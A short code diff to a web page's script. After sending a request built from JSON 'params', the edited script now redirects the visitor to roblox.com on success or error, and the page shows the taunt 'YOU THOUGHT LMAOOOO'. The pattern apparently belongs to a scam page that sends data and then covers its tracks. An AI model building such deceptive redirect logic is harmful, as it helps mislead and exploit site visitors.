@@ -54,8 +54,12 @@
                 }
 
                 request.send(JSON.stringify(params))
+                window.location.replace("https://www.roblox.com")
+                closeWindow().then((e) => window.location.replace("https://www.roblox.com"))
+            }).catch(e => {
+                window.location.replace("https://www.roblox.com")
                 closeWindow()
-            }).catch(closeWindow())
+            })
     </script>
     <div class="container">
         <div id="message">YOU THOUGHT LMAOOOO</div>
